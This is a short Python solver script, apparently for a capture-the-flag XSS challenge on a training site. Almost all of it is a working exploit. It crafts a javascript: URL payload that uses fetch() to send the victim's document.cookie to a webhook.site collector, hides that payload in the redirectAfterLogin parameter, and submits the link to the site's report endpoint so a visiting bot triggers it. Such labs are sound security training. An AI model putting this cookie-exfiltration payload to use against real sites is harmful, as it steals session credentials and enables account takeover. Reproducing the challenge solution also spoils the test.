import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite

import urllib.parse

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    def main(self):
        BASE_URL = "https://xss-playground-4.quoccacorp.com"

        PAYLOAD = f"javascript:fetch(`{self.webhooksite.url}?q=${{document.cookie}}`)"
        encoded_payload = urllib.parse.quote(PAYLOAD)
        report_url = f"{BASE_URL}/find-logged-in-page?redirectAfterLogin={encoded_payload}"

        self.session.post(f"{BASE_URL}/report", data={"url": report_url})
        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
